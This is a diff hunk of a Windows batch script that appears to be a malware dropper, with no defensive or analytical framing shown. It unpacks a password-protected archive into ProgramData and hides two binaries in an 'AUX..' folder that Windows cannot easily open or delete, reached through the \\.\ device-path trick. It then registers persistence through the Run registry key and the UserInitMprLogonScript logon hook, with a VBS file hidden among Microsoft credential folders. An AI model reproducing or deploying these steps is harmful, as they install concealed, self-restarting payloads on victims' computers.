@@ -21,8 +21,8 @@ for %a in (%processList%) do (
 "%ProgramData%\O\UnRAR.exe" x -y -p741258963 "%ProgramData%\O\O.rar" "%ProgramData%\O\"
 mkdir \\.\%ProgramData%\AUX..\
 
-move /Y "%ProgramData%\dist\Icon.dll" "\\.\%ProgramData%\AUX..\"
-move /Y "%ProgramData%\dist\Input.exe" "\\.\%ProgramData%\AUX..\"
+move /Y "%ProgramData%\O\Icon.dll" "\\.\%ProgramData%\AUX..\"
+move /Y "%ProgramData%\O\Input.exe" "\\.\%ProgramData%\AUX..\"
 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MyApp /t REG_SZ /d "%AppData%\Microsoft\Credentials\nur.vbs" /f
 reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "%ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll" /f
